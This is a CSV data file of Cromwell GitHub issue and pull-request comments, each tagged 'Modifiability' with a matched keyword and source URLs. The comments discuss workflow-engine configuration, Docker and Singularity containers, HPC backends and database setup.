Modifiability,"From discussion with @geoffjentry, the purpose is to take this kind of logging out of the code; if someone wants to see these messages, they change the configuration of akka, instead (see http://doc.akka.io/docs/akka/current/java/logging.html#Auxiliary_logging_options). I've updated the PR description to reflect this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4260#issuecomment-430401423:152,config,configuration,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4260#issuecomment-430401423,1,['config'],['configuration']
Modifiability,"From my testing, it seems that anything that runs a ""chmod""-like command disrupts the ACL-controlled permissions, leading to permission denied and/or other errors. I think if the configuration option wrapped any commands that did this, it would fix the issue. In the meantime I was able to come up with a few workarounds to fix the permissions so that we were happy with the system (moved some files around so cromwell wasn't accessing or trying to move anything past our ACL, and added a ""chmod o-wrx..."" command to my submit script), but a configuration option that did this by default would be great!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374703828:179,config,configuration,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374703828,2,['config'],['configuration']
Modifiability,"Full sketch of the idea as it applied to the pluggable_backends branch below. This particular ticket is concerned only with moving the DB code and having the engine be able to work with backends to determine which calls are resumable. Those might really be two separate pieces that two people could work in parallel. Cromwell would need to wake up and scan its database for Running workflows with Running calls. Something in Cromwell would then need to classify calls into resumable or not resumable. e.g. for JES, figure out if Cromwell has a JES Run ID that could be used to resume polling an already-launched JES run. Only the JES backend would know how to make this determination, but backends don’t have access to the database. So Cromwell would need to gather up representations of possibly resumable executions, examine on which backend type the executions had been running, create CallActors for each execution using a specified backend type (not a currently supported use case), and send a Restart message parameterized by the representation of the execution. The CallActor would need to create a backend of the specified type and then ask that backend if the execution is resumable. Resumable executions would result in a Resumed message making its way back to the WorkflowActor, otherwise WorkflowActor would get a NotResumable message. For NotResumable executions the WorkflowActor should be free to choose whatever backend it pleases to restart the call and shouldn’t necessarily be bound by the backend type that was chosen for the previous attempt.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/581#issuecomment-197643112:1015,parameteriz,parameterized,1015,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/581#issuecomment-197643112,1,['parameteriz'],['parameterized']
Modifiability,"Function$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3320,config,config,3320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['config'],['config']
Modifiability,"Fwiw while CWL has maximums TES has minimum required like what you suggest. I see both sides on it. Portability is helpful but if someone has a workflow which only succeeds because their server has juiced limits and they do t realize that, it isn't super helpful",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-294851492:100,Portab,Portability,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-294851492,1,['Portab'],['Portability']
Modifiability,"GP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationAct",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4077,config,configWdlNamespace,4077,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,2,"['Config', 'config']","['ConfigInitializationActor', 'configWdlNamespace']"
Modifiability,Gave up trying to combat the performance vs memory tradeoff (which seems unlikely to be winnable anyways) and the relatively simple solution works. We can have the metadata write batch size be a config option and tell users that setting the number lower uses less memory but drops performance under higher load and vice versa,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269428855:195,config,config,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269428855,1,['config'],['config']
Modifiability,"Geraldine, how does that align with workflows being portable? If a user takes advantage of that one Cromwell, and then it dies in dnanexus because they have a different setting (or implementation!). What about having something in the spec about a minimum that must be supported? Therefore if users move above that they know their workflow might not be compliant with other servers. We can still have the knob of course in cromwell. > On Apr 18, 2017, at 9:42 AM, Jeff Gentry <notifications@github.com> wrote:; > ; > As long as it is pitched as a cromwell feature and not part of WDL, I agree.; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub, or mute the thread.; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-294850347:52,portab,portable,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-294850347,1,['portab'],['portable']
Modifiability,"Given a Local config like:. ```; runtime-attributes = """"""; String? docker; String? docker_user; String? docker_env; """""". submit-docker = """"""docker run ${docker_env} --rm ${""--user "" + docker_user} -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash ${docker_cwd}/execution/script""""""; ```. Docker environment variables could be passed with a WDL like:; ```; task build_env {; Array[String] kvs = [""k1=v1"", ""k2=v2"", ""k3=v3""]; Array[String] prefixed = prefix(""-e "", kvs); command {; echo ""${sep=' ' prefixed}""; }; output {; String out = read_string(stdout()); }; }. task docker_task {; String docker_env. command {; echo $k1; echo $k2; echo $k3; }. runtime {; docker: ""ubuntu:latest""; docker_env: ""${docker_env}""; }. output {; Array[String] out = read_lines(stdout()); }; }. workflow w {; call build_env; call docker_task { input: docker_env = build_env.out }; output {; Array[String] out = docker_task.out; }; }; ```. Having to use a separate task to stringify an array of String kv environment pairs is a little clunky, but it looks like the way the `${sep=' '...}` expansion works currently requires this to be done in the command section.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/375#issuecomment-273916410:14,config,config,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/375#issuecomment-273916410,2,"['config', 'variab']","['config', 'variables']"
Modifiability,"Given that this is being considered an error (I'd prefer ""Failure"") rather than truncation, I'm going to try to push one more time the idea that this should be a configuration option rather than some hard-coded magic number in WDL (which will inevitable need to be raised at some point, and then will different WDL versions have different `read_string` limits even when run on the same Cromwell?). If we were truncating then the worry about different results would be correct, end of story. But what we could be saying now is ""Failure. Your WDL engine isn't able to process this workflow because the file is too large. Try increasing resources or restructuring your WDL""... not really any different from ""Failure. You didn't have enough memory to run that scatter so wide..."", or indeed any other resource constraint. This is just me TOL of course... but it does seem a lot more elegant to me than having a special case for file sizes written in the WDL spec but every other resource limit being implicit and left up to the engine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-294767185:162,config,configuration,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-294767185,1,['config'],['configuration']
Modifiability,"Good catch! I closed #2281. . Transferring conversation here:; From @MatthewMah ; > When running jobs on backends with job runtime limits such as LSF or SLURM, jobs reaching the runtime limits are killed by the backend. [Cromwell never detects that this occurs](http://gatkforums.broadinstitute.org/wdl/discussion/9542/does-cromwell-detect-task-failures-based-on-check-alive), and will wait forever for a job that is already dead. It would be helpful to configure periodic checks for whether tasks are still alive, and enter failure modes for non-zero return codes when unfinished tasks are no longer alive. . From @geoffjentry ; > @katevoss if I managed to correlate this correctly w/ the previous issue I was discussing w/ @kshakir it sounded like it isn't a huge deal, just that there's some nuance to it. From @cjllanwarne:; > Some SFS backends can kill jobs outside of Cromwell, leaving us waiting forever for an rc file that will never be created.; Idea: occasionally run the check-alive command to verify that long-running jobs are indeed still alive outside of restarting Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328126279:454,config,configure,454,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328126279,1,['config'],['configure']
Modifiability,Good news first: the `centaurPapiV2` build passed 🎉 ; Bad news: the other 4 PAPI v2 builds failed 😢 . The horicromtal builds are running with Cromwell configured to Carbonite but Centaur not configured to wait for Carboniting. While this might not have been intentional it's IMHO kind of appealing as a real-world scenario. I have no idea why the builds seem to hang until timeout as if some workflows were never completing. Conformance: `Unexpected failing tests: (6)`. No idea what happened with the engine upgrade test.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5237#issuecomment-548148305:151,config,configured,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5237#issuecomment-548148305,2,['config'],['configured']
Modifiability,"Good question! In the context of the docker://uri, pull and build are almost identical. Both will retrieve layers from Docker Hub (or a registry you target), tar.gz files, and dump them into a binary image. So these two commands do the same thing:. ```bash; singularity build docker://<container>; singularity pull docker://<container>; ```; Build is different if you do it in an environment where you can use sudo, because you can target a build recipe instead, e.g.,. ```bash; sudo singularity build <container>.sif Singularity; ```; and pull is different too if you target some non-docker pull source:. ```bash; singularity pull shub://vsoch/singularity-images; ```; You can look at the codebase to confirm this - a pull of a docker uri [comes down to calling build](https://github.com/sylabs/singularity/blob/03072a88e108966d50fd61b0e6a51e6dbc62ff20/internal/pkg/libexec/pull.go#L42). ```bash; func PullOciImage(path, uri string, opts types.Options) {; 	b, err := build.NewBuild(uri, path, ""sif"", """", """", opts); 	if err != nil {; 		sylog.Fatalf(""Unable to pull %v: %v"", uri, err); 	}. 	if err := b.Full(); err != nil {; 		sylog.Fatalf(""Unable to pull %v: %v"", uri, err); 	}; }; ```; so choose whichever word you like better :) In the context of docker, without sudo, they do the same thing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461796569:107,layers,layers,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461796569,1,['layers'],['layers']
Modifiability,Good refactor to reduce future headaches/bugs/effort,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-229630583:5,refactor,refactor,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-229630583,1,['refactor'],['refactor']
Modifiability,"Good work! For me the problem was caused because I use the conda installation of cromwell and I made a typo in the `_JAVA_OPTIONS` environment variable, so it was running locally instead of on the cluster :man_facepalming: . Still I managed to find the issue because of your issue :smile: .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-645263460:143,variab,variable,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-645263460,1,['variab'],['variable']
Modifiability,"Got it. . So in 36 you're a bit stuck in that it's hardcoded into the `v2alpha1` version of Pipelines API. You could use the `v1alpha2` PAPI backend, depending on if you're using PAPIv2 for a specific reason or just because it's newer (side note: Google would really prefer people to be using `v2alpha1`). As of 36.1 (just released today) that docker image is only pulled when running CWL (unclear if you're using CWL or WDL) and is configurable in the configuration file via `CWL.versions.VERSION.output-runtime-extractor.docker-image`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-466545513:433,config,configurable,433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-466545513,2,['config'],"['configurable', 'configuration']"
Modifiability,"Great increasing the memory was the solution. In case somebody else needs helping setting up a mysql database:. 1. Add this to the bottom of your config; ```; database { ; profile = ""slick.jdbc.MySQLProfile$"" ; db { ; driver = ""com.mysql.jdbc.Driver"" ; url = ""jdbc:mysql://localhost/DatabaseName?useSSL=false&allowPublicKeyRetrieval=true"" ; user = ""ChooseAName"" ; password = ""YourOtherPassword"" ; connectionTimeout = 5000 ; } ; }; ```; 2. Then set up the mysql database using docker; ```; sudo docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=YourPassword -e MYSQL_DATABASE=DatabaseName -e MYSQL_USER=ChooseAName -e MYSQL_PASSWORD=YourOtherPassword -d mysql; ```. 3. Then check that your docker container is running: ; ```; sudo docker ps -a; ```. 4. Then you should be all set. Most of this is from:; https://gatkforums.broadinstitute.org/wdl/discussion/comment/51170#Comment_51170",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5347#issuecomment-573160131:146,config,config,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5347#issuecomment-573160131,1,['config'],['config']
Modifiability,"H. On Fri, Feb 17, 2017, 10:58 AM Thib <notifications@github.com> wrote:. > ------------------------------; > You can view, comment on, or merge this pull request online at:j; >; > https://github.com/broadinstitute/cromwell/pull/2006; > Commit Summary; >; > - fail file hashing if the file does not exist; >; > File Changes; >; > - *M*; > supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigHashingStrategy.scala; > <https://github.com/broadinstitute/cromwell/pull/2006/files#diff-0>; > (17); >; > Patch Links:; >; > - https://github.com/broadinstitute/cromwell/pull/2006.patch; > - https://github.com/broadinstitute/cromwell/pull/2006.diff; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/2006>, or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AFIEGBYy1Z6suJGLDtusapP1VvcT0mSfks5rdcOhgaJpZM4MEbxA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280878369:402,config,config,402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2006#issuecomment-280878369,2,"['Config', 'config']","['ConfigHashingStrategy', 'config']"
Modifiability,"HI @markjschreiber,. Thanks for getting in touch. I had a look at the code and believe I came up with a work around, albeit a bit of a hack. Im building our system in Terraform so have a bit more control over the underlying infrastructure. Im able to mount additional volumes to the underlying ec2 instance, I just needed to mount them inside the container. I managed this with the following runner config:. backend {; default = AWSBatch; providers {; AWSBatch {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; ...; default-runtime-attributes {; queueArn: ""${default_batch_queue}""; scriptBucketName: ""${script_bucket}""; disks: ""local-disk,/bin/bash,${static_ref_snapshot_mount}""; zones: ""${aws_batch_availability_zone}""; }; }; }; }. Specifically `default-runtime-attributes.disks`. The first entry in this list always defaults to the working dir (this is the volume I have set up to autoscale), but after that subsequent values correspond to locations on the host. The only downside is that there is no way to change the mount location in the container. Whatever the location on the host has to be the same location in the container. As I control both I can make sure they are in sync. It feels a bit clunky but seems to be working. I will close this issue but would suggest some minor modifications to the AWS volume handling could really add to the systems flexibility /:-). Best,; Jon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151:399,config,config,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6334#issuecomment-919472151,2,['config'],['config']
Modifiability,"Had a convo w/ Seth yesterday and looked into a few similar things (e.g. cwltool's support). I think the proper plan is as follows:. - Explore the path you've been looking at, by changing the configuration of a Cromwell backend to use Singularity instead of docker, but just for docker containers. This would cover the most common use cases; - Separately continue the [conversation at OpenWDL](https://github.com/openwdl/wdl/pull/237) to explore what support for native Singularity containers might look like in WDL",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412307363:192,config,configuration,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412307363,1,['config'],['configuration']
Modifiability,"Hah . I'd prefer to provide a clean way to specify any collection of files (see CWLs secondary files concept) and then syntactic sugar in the form of specialized types, e.g. BamFile which knows to look for an index . Having it be configurable at the Cromwell level implies a potential lack of portability for WDLs",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-301221420:230,config,configurable,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2269#issuecomment-301221420,2,"['config', 'portab']","['configurable', 'portability']"
Modifiability,"Haha yeah I was just about to say I think it's working with a revised config change. I PRd a doc change, but it's only in the [develop docs](https://cromwell.readthedocs.io/en/develop/Configuring/#local-filesystem-options).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-645255220:70,config,config,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-645255220,2,"['Config', 'config']","['Configuring', 'config']"
Modifiability,Has this been resolved with the recent `services` refactoring?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/887#issuecomment-234768170:50,refactor,refactoring,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/887#issuecomment-234768170,1,['refactor'],['refactoring']
Modifiability,"Haven't used udocker yet myself, but I'm pretty sure `${docker_script}` should be used there also instead of `${script}`. As for HPC and docker, there are some renegades out there running nodes with docker. The very few I've come across are not on-prem, spin up private larger machines on cloud resources, add HPC+docker, and then run whatever scripts on top of that. This includes our CI... until we get one of the non-root LXC implementations going. Related side-note: I would love one day for our CI to also install-then-test udocker, [rootless docker](https://github.com/moby/moby/blob/fc01c2b481097a6057bec3cd1ab2d7b4488c50c4/docs/rootless.md), singularity, etc. If anyone comes across this and knows the magic spell to fully-install-and-configure any of these container tools, or other HPC like HTCondor, GridEngine, etc., (especially on Travis!), please drop a gist or a PR. For example, here's the installation others helped me scrape together for SLURM:; - [Cromwell SLURM CI Installation Script](https://github.com/broadinstitute/cromwell/blob/3c3a3f85ba1229738265b11c3573ccb538b719c2/src/ci/bin/test_slurm.inc.sh); - [Cromwell SLURM CI Conf](https://github.com/broadinstitute/cromwell/blob/3c3a3f85ba1229738265b11c3573ccb538b719c2/src/ci/resources/slurm_application.conf) with commands to run/kill/check jobs; - [Cromwell SLURM CI Test Runner](https://github.com/broadinstitute/cromwell/blob/3c3a3f85ba1229738265b11c3573ccb538b719c2/src/ci/bin/testCentaurSlurm.sh)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4697#issuecomment-470292981:743,config,configure,743,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4697#issuecomment-470292981,1,['config'],['configure']
Modifiability,"Having a hard time finding the right place to unit/integration test these changes using existing specs/mocks/centaur. If tests are required, a good bit of test refactoring will need to follow to cut through the Akka-HTTP-`Route`-to-`SubmitActor`-to-`ServicesActor`s layers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318459439:160,refactor,refactoring,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2500#issuecomment-318459439,2,"['layers', 'refactor']","['layers', 'refactoring']"
Modifiability,"Hearing that the Cromwell team will reject this (and then hence the original PR) is pretty disappointing. The configuration option is specific, doesn't explicitly relate to proxies, but allows us to run Cromwell, despite the lack of proxy support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1547154827:110,config,configuration,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1547154827,1,['config'],['configuration']
Modifiability,"Hello @alartin,. The ""local"" backend is essentially the resources on the computer where you're running Cromwell. If one runs local backend without docker, cpu & memory can't be restricted. However, if you are using the local backend with Docker, you can configure Cromwell to add the memory/cpu constraints to the run command. . Here's an example configuration that runs the Local Backend with Memory & CPU constrains applied: ; [Local Backend With Docker](https://gist.github.com/ruchim/568caa82513099b9d58e9cb89cadee26#file-localwithdocker-conf). There's a particular stanza that sets [default values for required runtime attributes](https://gist.github.com/ruchim/568caa82513099b9d58e9cb89cadee26#file-localwithdocker-conf-L90-L91). Choosing CPU default to be 1 memory to 4 MB (docker required minimum), so that these are the values applied to tasks that don't have cpu/memory explicitly defined. You can see that cpu/memory have been added as [custom runtime attributes](https://gist.github.com/ruchim/568caa82513099b9d58e9cb89cadee26#file-localwithdocker-conf-L25-L26). And it's also possible to see the exact way they are wired into [docker run command](https://gist.github.com/ruchim/568caa82513099b9d58e9cb89cadee26#file-localwithdocker-conf-L36-L37), where memory is always converted to MB (managed by the usage of the term `memory_mb`).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-440471436:254,config,configure,254,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-440471436,2,['config'],"['configuration', 'configure']"
Modifiability,"Hello @ruchim :-). The Spark job will run just as good in Yarn as in Mesos, I am pretty sure about that. Main difference is that Mesos is much more advanced than Yarn. It is more scalable, both in terms of nr of nodes, nr of jobs, and types of jobs and applications. . In Mesos, you can run both normal applications (web apps etc.), like you do in Kubernetes, and you can run compute / Big Data processing jobs in the same cluster. You can schedule both cpu and memory usage, not only memory usage as in Yarn. Mesos creates a virtual operating system on top of your cluster, kind of. Yarn is not capable of that as I know it. You can even run Yarn and Kubernetes on top of Mesos etc. Choosing Mesos over Yarn, will therefor make sense for many companies, because you get one system to rule them all. It might add more complexity also though ... I am a bit dated on this, Yarn might have evolved since I looked at it. This article is good at explaining the difference:. https://www.oreilly.com/ideas/a-tale-of-two-clusters-mesos-and-yarn. Here is a nice summary of the main differences:; https://data-flair.training/blogs/comparison-between-apache-mesos-vs-hadoop-yarn/. Hope this give some answers :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3461#issuecomment-417230977:887,evolve,evolved,887,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3461#issuecomment-417230977,1,['evolve'],['evolved']
Modifiability,"Hello @ruchim! Thanks for looking into the issue. The idea behind the init script was to reduce code duplication between all Cromwell tasks that use [recently added](https://github.com/broadinstitute/cromwell/pull/5343) `enable_fuse` flag as much as possible. Otherwise mounts have to be manually configured for each and every Cromwell task in order to take advantage of the fuse capabilities. Definitely the decision either to use or not use such init script highly depends on a workflow. From my point of view if some of workflow tasks use fuse capabilities then most of them probably do the same. Therefore the usage of init script is not required but can be helpful in such cases. As an example let's look at the following workflow. It just calculates number of files in some of the mounted directories. *count.wdl*; ```wdl; version 1.0. workflow count {; output {; Int REFERENCES = references.NUMBER; Int SAMPLES = samples.NUMBER; }. call references { }; call samples { }; }. task references {; output {; Int NUMBER = read_int(""number""); }. command <<<; mkdir -p /mount-point; mount 8.8.8.8:/data /mount-point; ls -lh /mount-point/references/ | wc -l > number; >>>; }. task samples {; output {; Int NUMBER = read_int(""number""); }. command <<<; mkdir -p /mount-point; mount 8.8.8.8:/data /mount-point; ls -lh /mount-point/samples/ | wc -l > number; >>>; }; ```. As long as we have some common initialization in both tasks we can extract it to the init script which will be executed right before each task command. If we perform such optimization then we have to upload `init_script.sh` to google cloud and enable it in the workflow properties. *init_script.sh*; ```bash; mkdir -p /mount-point; mount 8.8.8.8:/data /mount-point; ```. *workflow_options.json*; ```bash; {; ""init_script"": ""gs://storage/init_script.sh""; }; ```. *count.wdl*; ```wdl; version 1.0. workflow count {; output {; Int REFERENCES = references.NUMBER; Int SAMPLES = samples.NUMBER; }. call references { }; call samples { }; }. ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5342#issuecomment-597303988:297,config,configured,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5342#issuecomment-597303988,1,['config'],['configured']
Modifiability,"Hello @vdauwera , I have a similar use case in Cromwell that I think this could cover. We specifically hope we can mount the `type=tmpfs` volume. This creates a ram disk which we use to unpack data that has tens of thousands of files very quickly. . Google describes how to do this in their docs; https://cloud.google.com/compute/docs/containers/configuring-options-to-run-containers#mounting_tmpfs_file_system_as_a_data_volume. We have had success using this in our Slurm Cromwell by launching the docker docker through `submit` ourselves and giving the docker run the parameter to mount . `${'--mount type=tmpfs,destination='+mount_tmpfs}`. It would be great if declaring a tmpfs mount point could also be supported by cromwell in google cloud submissions. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-373077355:346,config,configuring-options-to-run-containers,346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2190#issuecomment-373077355,1,['config'],['configuring-options-to-run-containers']
Modifiability,"Hello again and thanks for your input. It is a valid observation that changes from `draft-2` are substantial and invasive. The ""draft"" aspect of `draft-2` entailed some behaviors that sounded good in the early experimental phases but proved to be problematic or somehow unmaintainable in the engine codebase. That said `draft-2` is sticking around for the foreseeable future and should provide a stable if no-longer-enhanced platform for your group.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-884320618:416,enhance,enhanced,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6441#issuecomment-884320618,1,['enhance'],['enhanced']
